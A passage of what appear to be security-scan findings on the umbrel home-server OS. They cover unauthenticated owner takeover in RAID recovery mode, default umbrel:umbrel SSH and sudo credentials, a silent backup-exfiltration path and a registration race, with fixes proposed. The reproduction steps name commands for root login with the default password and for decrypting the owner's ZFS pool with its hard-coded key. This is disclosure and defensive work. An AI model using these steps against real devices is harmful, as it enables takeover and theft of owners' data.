   On the boot after setup, handlePostBootRaidSetupProcess registers the attacker-supplied name/password from the config partition as the device owner because the new empty pool has no user.
10. [packages/umbreld/source/modules/user/user.ts:182–194](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/user.ts#L182-L194)
   user.register (the no-raidDevices path) calls setName and setPassword, which also write user.name and user.hashedPassword to the config partition when hasConfigStore() is true (it is, in recovery mode) and syncSystemPassword sets the Linux `umbrel` account's password to the attacker's, so the forged owner can sudo to root from the terminal.
11. [packages/os/overlay/opt/umbrel-data/umbrel-data-mount:139–171](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/opt/umbrel-data/umbrel-data-mount#L139-L171)
   Documents recovery mode: an unimportable or unwritable pool makes the mount script exit non-zero, rugix records data-mount-error.log and falls back to an in-memory overlay so umbreld boots with an empty store; the dataset key is the fixed passphrase 'umbrelumbrel'.
12. [packages/os/rugix/recipes/setup-rugix/files/state-data.toml:1–5](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/rugix/recipes/setup-rugix/files/state-data.toml#L1-L5)
   overlay-fallback = in-memory is the shipped rugix state configuration that produces the empty store in recovery mode.
13. [packages/ui/src/router.tsx:195–197](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/router.tsx#L195-L197)
   The shipped UI wraps /onboarding in EnsureNoRaidMountFailure, which redirects to /raid-error in recovery mode; the recovery screen offers only shutdown, restart and factory reset. Registration or RAID re-setup from recovery mode is therefore not a sanctioned path, only an API gap.
14. [packages/ui/src/routes/onboarding/storage-selection.ts:17–24](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/routes/onboarding/storage-selection.ts#L17-L24)
   RAID onboarding (ssd-raid / hdd-raid) is offered on generic non-Pro devices with internal disks, so the no-wipe owner takeover (register without raidDevices, which routes.ts only forbids on Umbrel Pro) applies to a sanctioned class of installs.
15. [packages/umbreld/source/modules/server/terminal-socket.ts:94–108](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/terminal-socket.ts#L94-L108)
   An owner session can open /terminal, which spawns a host shell via sudo as the uid-1000 `umbrel` user; this is how a forged owner turns API access into host access.
16. [packages/os/umbrelos.Dockerfile:508–510](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/umbrelos.Dockerfile#L508-L510)
   The `umbrel` system user is a member of the sudo group, so the terminal shell plus the password register synced to it yields root.

## Impact
Integrity: the owner's RAID members are reformatted, the config partition's RAID config and owner credential copy are replaced, and the attacker becomes device owner with root via the sudo-group terminal. Availability: the owner's install and the data on wiped members are destroyed. Confidentiality: the forged owner is root on the host while the owner's disks are attached and the dataset key is the fixed `umbrelumbrel`, so on the no-wipe path (non-Pro) or via any unwiped member the owner's full dataset is readable wherever the pool is importable (degraded failsafe pool, read-only-after-errors pool); the config partition's owner hash is readable in every case.

## Reproduction steps
1. Attacker is any network peer that can reach the dashboard served by lan-ingress on 80/443 (LAN, Tailscale/Tor where they survive the failed mount, or a browser coerced by DNS rebinding). Precondition outside the attacker's control: the device must be in RAID mount-failure recovery mode, a real operational state the maintainers test for in raid-recovery-mode.vm.test.ts. No credentials or user interaction: enumerate devices via two fall-open queries, then one user.register mutation triggers wipefs/sgdisk/zpool create as root and a reboot that installs the attacker as owner; on non-Pro RAID installs a single register call yields an owner session and a root shell via /terminal.

## Recommended fix
1. triggerInitialRaidSetupBootFlow/#setup treat an empty store as a never-onboarded device and will format any non-system disk, even when the config partition already records a RAID install whose members those disks are. Fix criteria: Initial RAID setup must be refused when configStore.raid already exists unless the caller proves ownership (password validated against configStore.user.hashedPassword, or a physical reset/console confirmation), and devices carrying the configured pool's labels or partitions must never be passed to wipefs/sgdisk/zpool create. Verify: in mount-failure state, user.register with raidDevices and no valid owner password returns an error and no device is modified.
2. user.register and the publicProcedureWhenNoUserExists tier use user.exists() on the live store as the sole onboarding signal, which is false whenever the real data directory failed to mount and rugix's in-memory fallback is in use. Fix criteria: Registration (with or without raidDevices) must be rejected while the device is in RAID mount-failure recovery mode (data-mount-error.log present and configStore.raid set) unless the owner authenticates against the credential copy on the config partition, matching what the shipped UI already enforces by routing recovery mode to /raid-error. Verify: in recovery mode an unauthenticated user.register call fails, no owner session can be created and the config partition's user fields are unchanged.

---
**Severity:** HIGH
**Status:** Open
**Category:** Auth bypass
**CWE:** [CWE-306](https://cwe.mitre.org/data/definitions/306.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258117

---

# Image-baked umbrel:umbrel SSH/sudo credential is re-armed at every boot and stays valid throughout RAID recovery mode

## Details
umbrelOS ships a well-known password for a sudo-capable account that is reachable over SSH, and relies on a best-effort runtime fix-up that does not cover the exposed windows.

`packages/os/umbrelos.Dockerfile` 508-510 creates the `umbrel` Linux user, sets its password to `umbrel` with `chpasswd`, and adds it to the `sudo` group; `openssh-server` is installed at line 345 and nothing under `packages/os` ships an `sshd_config` override or disables `ssh.service`, so Debian trixie's defaults apply (service enabled, `PasswordAuthentication yes`). `/etc/sudoers.d/umbrel` only sets `lecture_file`, leaving Debian's `%sudo ALL=(ALL:ALL) ALL` password-sudo in force. The umbreld nftables table (`lan-ingress.ts` 1278-1279) is `policy accept` on both chains and only redirects dashboard/app ports, so TCP/22 is reachable from any LAN peer (and from a tailnet when the Tailscale module is enabled; Tor exposes only ports 80/2000).

The only code that ever replaces this password is `User.syncSystemPassword()` (`user.ts` 128-158): it pipes the owner's bcrypt hash into `chpasswd --encrypted`, but only when `user.hashedPassword` exists in the live store. It is invoked from `setPassword` (user.ts 122) and once, fire-and-forget, at umbreld start (`index.ts` 276) after `commitOsPartition`, the migration module and `auth.start()`. `/etc/shadow` lives on the Rugix root overlay, which `state-data.toml` does not persist (only `/data` is listed; no `overlay = "persist"`), so the chpasswd result is lost at the next boot and the password reverts to `umbrel`. The repository corroborates that `/etc` does not survive reboots: `overlay/etc/motd` states modifications 'will not be persisted between system restarts', `umbrel-ssh-host-key-hydration` re-copies SSH host keys from `/data/ssh` into `/etc/ssh` before `ssh.service` on every boot, and `restoreHostname` runs 'after boot/update'.

Consequently `ssh umbrel@<device>` with password `umbrel` followed by `sudo -S` with the same password yields root on the host in these windows:

1. Every boot of an onboarded device: `ssh.service` starts at `network.target`, while `umbrel.service` is ordered `After=network-online.target docker.service libvirtd.socket umbrel-custom-pre-start.service` (the pre-start hook may run up to its timeout) and umbreld then performs OS-partition commit, migrations and auth start before line 276. A LAN peer who notices the reboot (or forces one via any availability bug) logs in during that window; the maintainers' own VM harness (`create-test-umbreld.ts` 713-752, 785-788) documents that `umbrel`/`umbrel` works over SSH and for sudo until the sync lands.
2. The whole RAID mount-failure recovery session (`raid.ts` 1196-1198; `umbrel-data-mount` 160-162): Rugix falls back to an in-memory root overlay, the data directory and store are empty, `user.hashedPassword` is absent, so `syncSystemPassword` never runs and the default stays valid until the owner repairs the array — regardless of the overlay setting. The owner's disks remain attached; as root the attacker can `zpool import -f -d /dev/disk/by-umbrel-id <pool>` and `zfs load-key` with the hard-coded passphrase `umbrelumbrel` (`umbrel-data-mount` 145) and read every file, app secret and the credential store. This is full confidentiality loss on top of the integrity-only impact of the already-verified unauthenticated factory reset in the same mode.
3. After a power-button recovery reset (`power-button.sh` 12) until the owner next sets a password.

Before onboarding the same credential is also live, but there the project already concedes the device to any LAN peer via `publicProcedureWhenNoUserExists` registration, so that window adds little; the gain in windows 1-3 is root on an already-onboarded device whose owner has set a strong password.

Explicit assumptions: Debian trixie (`ARG DEBIAN_VERSION=trixie`) openssh-server enables `ssh.service` and defaults to `PasswordAuthentication yes`; Debian's sudoers grants `%sudo` password-sudo; Rugix Ctrl (the version baked by `packages/os/rugix`) discards the root overlay at boot when `overlay` is unset — the in-repo motd, host-key hydration and hostname restore are consistent with that, and the recovery-mode window (in-memory overlay) does not depend on it.

## Evidence
1. [packages/os/umbrelos.Dockerfile:507–510](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/umbrelos.Dockerfile#L507-L510)
   The shipped image creates the `umbrel` account with the well-known password `umbrel` and adds it to the `sudo` group (Debian default `%sudo ALL=(ALL:ALL) ALL`, password sudo; overlay/etc/sudoers.d/umbrel only sets lecture_file). Line 345 installs openssh-server, which Debian enables by default; no sshd_config override exists anywhere in packages/os, so PasswordAuthentication stays on.
2. [packages/umbreld/source/modules/user/user.ts:128–158](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/user.ts#L128-L158)
   syncSystemPassword is the only code that ever changes the system password. It runs `chpasswd --encrypted` only when `user.hashedPassword` exists in the live store; when the store has no user (pre-onboarding, RAID recovery mode) it silently does nothing and the image default remains valid.
3. [packages/umbreld/source/index.ts:275–276](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/index.ts#L275-L276)
   The boot-time sync is invoked once, fire-and-forget, during umbreld start — after commitOsPartition, the migration module, store writes and auth.start(). The comment 'after OTA update' shows the maintainers expect /etc/shadow to revert; with a discarded root overlay it reverts on every reboot.
4. [packages/os/rugix/recipes/setup-rugix/files/state-data.toml:1–8](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/rugix/recipes/setup-rugix/files/state-data.toml#L1-L8)
   Rugix state config persists only /data and sets overlay-fallback = "in-memory". /etc/shadow lives on the root overlay, which is not persisted (no `overlay = "persist"`), so every chpasswd result is lost on the next boot; in RAID recovery mode the overlay is in-memory so the image default is live regardless.
5. [packages/os/overlay/opt/umbrel-ssh-host-key-hydration/umbrel-ssh-host-key-hydration:17](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/opt/umbrel-ssh-host-key-hydration/umbrel-ssh-host-key-hydration#L17)
   Corroborates that /etc does not survive reboots: SSH host keys must be re-copied from /data/ssh into /etc/ssh before ssh.service on every boot (umbrel-ssh-host-key-hydration.service, Before=ssh.service). overlay/etc/motd 13-18 states the same for all system modifications.
6. [packages/os/overlay/etc/systemd/system/umbrel.service:3–4](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/etc/systemd/system/umbrel.service#L3-L4)
   umbreld (and therefore the password sync) starts only After docker.service, network-online.target, libvirtd.socket and umbrel-custom-pre-start.service. ssh.service starts at network.target, so on every boot there is a window in which sshd accepts umbrel:umbrel before umbreld reaches the sync.
7. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:1278–1279](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L1278-L1279)
   The device firewall (nftables table created by lan-ingress) uses `policy accept` on both chains and only redirects dashboard/app ports; TCP/22 is reachable from the LAN (and a tailnet if Tailscale is enabled) without restriction.
8. [packages/umbreld/source/modules/hardware/raid.ts:1196–1198](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1196-L1198)
   RAID mount-failure recovery mode is detected via the Rugix data-mount-error log; umbreld then runs on an in-memory overlay with an empty store, user.exists() is false, so syncSystemPassword never runs and umbrel:umbrel stays valid for the entire recovery session until the owner intervenes.
9. [packages/os/overlay/opt/umbrel-data/umbrel-data-mount:139–145](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/opt/umbrel-data/umbrel-data-mount#L139-L145)
   The ZFS data dataset is encrypted with the hard-coded passphrase `umbrelumbrel`. A LAN attacker who obtains root over SSH in recovery mode can `zpool import -f` the owner's degraded/read-only pool and `zfs load-key` it with this constant, reading all user data, app data and secrets.
10. [packages/os/overlay/etc/acpi/power-button.sh:9–12](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/etc/acpi/power-button.sh#L9-L12)
   The power-button recovery sequence also resets the system account to umbrel:umbrel (and the dashboard hash to a fixed bcrypt of the default), creating another period during which the network-reachable default credential is valid.
11. [packages/umbreld/source/modules/test-utilities/create-test-umbreld.ts:713–715](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/test-utilities/create-test-umbreld.ts#L713-L715)
   Corroboration only: the maintainers' VM harness logs in over SSH (guest port 22) as `umbrel` with password `umbrel` before registration and falls back to it afterwards (749-752), and runs `sudo -S` with `umbrel` (785-788). This confirms sshd with password authentication and password-sudo are active in the production image and that the default credential works until the sync happens.

## Impact
Root shell on the host: read of all user data, member data, app data and credential stores (umbrel.yaml, sessions, network/cloud credentials); in recovery mode the ability to import and decrypt the owner's RAID pool with the hard-coded key; arbitrary persistent modification (e.g. planting custom-hooks/pre-start on the persisted data partition, which runs as root on every boot); and complete denial of service.

## Reproduction steps
1. Attacker: any unauthenticated peer able to reach TCP/22 on the device (LAN; a tailnet if Tailscale is enabled). They run `ssh umbrel@device` with password `umbrel` and then `sudo -S` with the same password. This succeeds deterministically whenever the device is in one of the windows: early boot before umbreld's sync at index.ts:276 (every reboot), the whole RAID mount-failure recovery session, or after a power-button reset. Those windows are device state the attacker does not directly control but can observe (reboot detection) and that recur on every boot, hence AT:PRESENT. No defence stands in the way: no key-only auth, no locked account, no port filtering, and a single correct password is not affected by sshd's failure penalties. No user interaction is needed.

## Recommended fix
1. The OS image bakes a well-known password into a sudo-capable account that is reachable over SSH, and the only override (syncSystemPassword) is lost on every reboot because /etc/shadow lives on the discarded Rugix overlay. Fix criteria: At no point in the device lifecycle may the literal password `umbrel` authenticate over SSH or to sudo. For example: ship the account locked (`!` hash) and have umbreld unlock it only by writing the owner hash; and/or persist /etc/shadow (or the synced hash) across reboots so the window at boot disappears; and/or disable SSH password authentication until the owner opts in. Verify by attempting `ssh umbrel@device` with password `umbrel` immediately after sshd starts on a reboot, before onboarding, and in RAID recovery mode — all must be refused.
2. syncSystemPassword falls back to doing nothing when the live store has no user, so recovery mode (and any store-loss state) leaves the image default active while the owner's disks are attached. Fix criteria: When no owner hash is available in the live store, the account must remain locked rather than inheriting the image default; in RAID recovery mode the owner hash saved on the config partition (configStore user.hashedPassword) can be used to set it. Verify that in recovery mode SSH login as umbrel with `umbrel` fails and login with the owner's real password (or none at all) is the only option.

---
**Severity:** HIGH
**Status:** Open
**Category:** Default credentials
**CWE:** [CWE-1393](https://cwe.mitre.org/data/definitions/1393.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258116

---

# Pre-onboarding connectToExistingRepository persists attacker backup destination; hourly backups exfiltrate data dir

## Details
During the onboarding window (fresh install, after factory reset, or Umbrel Pro RAID recovery mode where umbrel.yaml has no user), the backups and files routers expose connectToExistingRepository, listBackups, restoreBackup and addNetworkShare without authentication so that a user can restore before creating an account. connectToExistingRepository, however, has the same side effects as the owner-only createRepository: Backups.addRepository (backups.ts:271-348) writes {id, path, password} into backups.repositories in umbrel.yaml and connects kopia to it. Nothing marks the record as transient or onboarding-scoped, and User.register (user.ts:182-196) does not reset or surface store entries made before the account existed.

Attack: an unauthenticated LAN/Tailscale/Tor peer runs an SMB server with a kopia filesystem repository created with password sha256(P)[:16] under '<share>/Umbrel Backup.backup'. They call files.addNetworkShare({host, share, username, password}) - the device mounts the attacker's share under <data>/network/<host>/<share> and persists it with credentials - then backups.connectToExistingRepository({path: '/Network/<host>/<share>', password: P}). kopia connects successfully, and the repository is persisted. The attacker does not restore anything, so the victim notices nothing and completes onboarding normally.

Once a user exists, Backups.backupOnInterval (156-198) snapshots the entire data directory to every stored repository hourly: home/ and app-data/ (all user and app data), umbrel.yaml (owner bcrypt hash, TOTP URI, Wi-Fi password, NAS credentials, other repositories' passwords), secrets/auth/system-token and sessions.yaml. The snapshot is encrypted with the password the attacker chose and lands on the attacker's server. The network-storage watch loop remounts the share every minute, keeping the channel alive. With the raw system token the attacker then authenticates to the device as the owner over the network (auth.ts:414-418), gaining full control (apps, files, shell-equivalent via compose), and can also crack the bcrypt hash or reuse NAS/Wi-Fi credentials.

The only trace is an extra entry in Settings > Backups and Files > Network; no notification is raised and 'backups-failing' alerts only on failure. This is distinct from the inherent first-come onboarding race via user.register: it leaves the legitimate owner fully in control while silently copying their data to the attacker, which they have no reason to suspect.

## Evidence
1. [packages/umbreld/source/modules/backups/routes.ts:80–82](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/routes.ts#L80-L82)
   connectToExistingRepository is publicProcedureWhenNoUserExists: any unauthenticated network peer reaching the dashboard (lan-ingress proxies to the umbreld /trpc mount, server/index.ts:216, with no onboarding gating) can call it while no owner account exists (fresh install, after factory reset, RAID recovery mode).
2. [packages/umbreld/source/modules/backups/backups.ts:271–347](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/backups.ts#L271-L347)
   addRepository validates only that the path is under /Network or /External (275-278), derives the kopia password sha256(P)[:16] from the caller-supplied password (288), persists {id, path, password} into backups.repositories in the central store at 325-335 and connects (338). On connect success the record is kept; nothing scopes it to the onboarding session, so it is indistinguishable from an owner-created repository.
3. [packages/umbreld/source/modules/backups/backups.ts:156–198](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/backups.ts#L156-L198)
   backupOnInterval runs once user.exists() is true and iterates every repository in the store, snapshotting the whole data directory (662: 'snapshot create <dataDirectory>') to each one hourly. The attacker's repository is therefore backed up to automatically after the legitimate owner finishes onboarding; 'backups-failing' notifies only on failure.
4. [packages/umbreld/source/modules/files/routes.ts:476–485](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/routes.ts#L476-L485)
   addNetworkShare is also publicProcedureWhenNoUserExists, letting the same peer have the device mount (as root) an SMB share they control under /Network and persist it with credentials in the store.
5. [packages/umbreld/source/modules/files/network-storage.ts:228–254](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/network-storage.ts#L228-L254)
   addShare mounts the CIFS share via mount -t cifs (154) and saves {host, share, username, password, mountPath} to files.networkStorage; the watch loop at 87-115 remounts it every minute, so the attacker's destination stays reachable.
6. [packages/umbreld/source/modules/user/user.ts:182–196](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/user.ts#L182-L196)
   register() only sets user.name/language/widgets/password and adds a notification; it does not reset or surface store entries created during the unauthenticated window. backups.repositories and files.networkStorage are written only by backups.ts and network-storage.ts, so the attacker's repository and share survive onboarding.
7. [packages/umbreld/source/modules/backups/backups.ts:754–849](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/backups.ts#L754-L849)
   The generated .kopiaignore excludes caches, SQLite files, machine images, lan-ingress certs, /External and /Network, but not umbrel.yaml (owner bcrypt hash, totpUri, wifi, NAS credentials, other repositories' passwords) nor secrets/auth (system-token, sessions.yaml); these are included in every snapshot.
8. [packages/umbreld/source/index.ts:202](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/index.ts#L202)
   The central store is `${dataDirectory}/umbrel.yaml`, i.e. inside the snapshotted data directory.
9. [packages/umbreld/source/modules/auth/auth.ts:172–173](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/auth.ts#L172-L173)
   Auth secrets live at `${dataDirectory}/secrets/auth` (system-token file and sessions.yaml), also inside the snapshotted data directory.
10. [packages/umbreld/source/modules/auth/auth.ts:415–418](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/auth.ts#L415-L418)
   The raw system token from secrets/auth/system-token authenticates as the owner 'system' principal over the normal Bearer path (is-authenticated.ts:16 -> authenticateApiCredentials -> authenticateDashboardCredentials, which returns the system principal at 395 without a browser-session cookie) with no loopback restriction, so an exfiltrated snapshot yields live owner access to the device.
11. [packages/umbreld/source/modules/server/trpc/is-authenticated.ts:62–65](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/trpc/is-authenticated.ts#L62-L65)
   isAuthenticatedIfUserExists skips authentication entirely whenever user.exists() is false.

## Impact
Hourly snapshots of the full data directory (home/, app-data/ incl. wallets, umbrel.yaml with owner bcrypt hash, totpUri, wifi and NAS credentials, secrets/auth/system-token and sessions.yaml) are delivered to an attacker-controlled server encrypted with an attacker-known key: total confidentiality loss. The exfiltrated system token authenticates as the owner against the live device over the network (auth.ts:416), giving full integrity and availability control (install apps, modify files, shutdown, factory reset).

## Reproduction steps
1. Attacker is any network peer able to reach the dashboard port while the device has no registered owner (initial setup, after factory reset, or RAID recovery mode). They host an SMB share containing a kopia filesystem repository created with password sha256(P)[:16] at '<share>/Umbrel Backup.backup', call files.addNetworkShare then backups.connectToExistingRepository over /trpc (no credentials, no browser), and wait; they do not call restoreBackup, so the owner sees a pristine device and onboards normally. The sanctioned restore flow ends in a reboot into the restored data directory, which would discard the pre-onboarding store entry; only the connect-without-restore path leaves it behind. The onboarding window is a runtime state outside the attacker's control, so AT is PRESENT. Assumes kopia 0.19.0 (packages/os/umbrelos.Dockerfile:26) behaves per its documented CLI: 'repository connect filesystem --path --password' succeeds against any repository whose password matches, including one on a CIFS mount (the same mechanism the product uses for NAS backups).

## Recommended fix
1. Pre-onboarding connectToExistingRepository has the persistent side effects of the owner-only createRepository: it stores the repository (and addNetworkShare stores the share) in the long-lived store without any onboarding scoping, violating the principle that unauthenticated callers must not create durable owner-level configuration. Fix criteria: Repositories and network shares added while no user exists must not survive into the owner's configuration: either keep them transient (in-memory, used only for the restore flow and discarded if no restore happens / on register) or purge every pre-onboarding backups.repositories and files.networkStorage entry when the owner account is created. Verify by connecting a repository and adding a share before registering, then registering, and confirming getRepositories/listNetworkShares are empty and no backup job targets them.
2. Scheduled backups run against any repository in the store with no indication to the owner of where a destination came from, so an unknowingly inherited destination is backed up to silently. Fix criteria: Automatic backups should only target repositories the authenticated owner explicitly created or confirmed; adding any repository should produce an owner-visible notification. Verify that a store entry of unknown provenance does not receive snapshots.
3. The raw owner-equivalent system token is included in every snapshot, so disclosure of any backup grants live owner access. Fix criteria: Snapshots should not contain credentials that authenticate against the live device (exclude secrets/auth/system-token from .kopiaignore or rotate it whenever a repository is added/connected), so that a leaked snapshot cannot be replayed for network access.

---
**Severity:** HIGH
**Status:** Open
**Category:** Missing Authentication
**CWE:** [CWE-306](https://cwe.mitre.org/data/definitions/306.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257929

---

# First RAID boot accepts network registration before the onboarded owner's credentials are applied

## Details
On a multi-drive device the onboarding owner submits name/password with raidDevices; Raid.triggerInitialRaidSetupBootFlow persists them to the config partition and reboots, and the owner is told setup is completing. The account is only actually created on the next boot by handlePostBootRaidSetupProcess (raid.ts:1151-1168), which runs inside raid.start() as one of the concurrently started modules.

index.ts starts lanIngress (public 80/443 → umbreld) at line 293, then runs hardware.start() and server.start() together in a Promise.all (320-329). server.start() binds immediately (server/index.ts:357). raid.start() first writes three sysfs parameters and starts the pool monitor, then handlePostBootRaidSetupProcess reads the config partition and calls user.register, which only makes user.exists() true once setName completes (a config-partition write with remount rw/ro and copy, plus the store write). During that window the API is up and user.register (user/routes.ts:57-90) is publicProcedure gated solely on ctx.user.exists() == false, so a LAN/Tailscale/Tor peer polling user.register across the reboot is accepted and becomes the device owner. The legitimate post-boot register then throws 'Attempted to register when user is already registered' (user.ts:185); the owner's chosen credentials are discarded, surfaced only via initialRaidSetupError on checkInitialRaidSetupStatus, and the owner's plaintext password remains on the config partition because the delete is skipped (see finding raid-setup-plaintext-owner-password-persisted-on-boot-disk).

The attacker now holds the owner account on a device the victim believes they just set up: full owner-tier API, /terminal host shell via sudo, ability to install apps, and the victim is locked out (they do not know the attacker's password; factory reset requires it or recovery mode). On Umbrel Pro the attacker's register must include raidDevices, which would have to be a spare disk (members of the just-mounted pool are busy), so the practical target is non-Pro multi-drive installs and Pro units with an unused bay.

Unlike the generic first-come onboarding model, here the owner has already completed registration and the system itself reopens the unauthenticated registration window after reboot. The maintainers guarded the pre-reboot gap (isInitialSetupInProgress, 1136-1143) but not the post-reboot one. The window is short (hundreds of milliseconds to a few seconds depending on boot timing), so exploitation requires winning a race, but it is scriptable: poll user.exists/user.register continuously while the device reboots.

## Evidence
1. [packages/umbreld/source/modules/hardware/raid.ts:1152–1173](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1152-L1173)
   handlePostBootRaidSetupProcess creates the owner from the credentials saved on the config partition. It runs inside raid.start() after three sysfs writes and pool-monitor startup; user.exists() stays false until its user.register reaches setName's store write (which first spawns `mount -o remount,rw`, writes the FAT config, copies it, and remounts ro). If a network registration lands first, this register throws and the owner's credentials are discarded (initialRaidSetupError), and the plaintext password delete is skipped.
2. [packages/umbreld/source/index.ts:293–329](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/index.ts#L293-L329)
   `await this.lanIngress.start()` (public 80/443 to umbreld) completes before the Promise.all that starts hardware (raid.start → handlePostBootRaidSetupProcess) and server concurrently, so the tRPC API is reachable from the LAN while the config-partition owner is still being created. No readiness gate exists anywhere in the request path.
3. [packages/umbreld/source/modules/hardware/raid.ts:596–600](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L596-L600)
   raid.start() awaits handlePostBootRaidSetupProcess only after the ARC sysfs writes and #startPoolMonitor; hardware.start() (hardware.ts:30-35) runs raid.start() in a Promise.all with the other hardware submodules, itself inside index.ts's module Promise.all alongside server.start().
4. [packages/umbreld/source/modules/server/index.ts:355–358](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L355-L358)
   server.start() binds 127.0.0.1:port immediately after synchronous route setup; nothing waits for RAID post-boot processing, so requests proxied by lan-ingress are served from this point.
5. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:803–811](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L803-L811)
   The dashboard HTTP/HTTPS proxies on public ports 80/443 forward to the fixed umbreld port and are created by lanIngress.start()'s synchronous first refresh, i.e. before the internal server and RAID modules start; a peer's requests fail with upstream connection errors until server.listen completes and then go through.
6. [packages/umbreld/source/modules/user/routes.ts:57–90](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L57-L90)
   user.register is publicProcedure gated only on ctx.user.exists(); it does not consult the pending config-partition user or any RAID first-boot state, so a network peer's registration in the window is accepted and becomes the owner (on non-Pro hardware without raidDevices; on Umbrel Pro only with raidDevices naming a spare disk).
7. [packages/umbreld/source/modules/user/user.ts:182–195](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/user.ts#L182-L195)
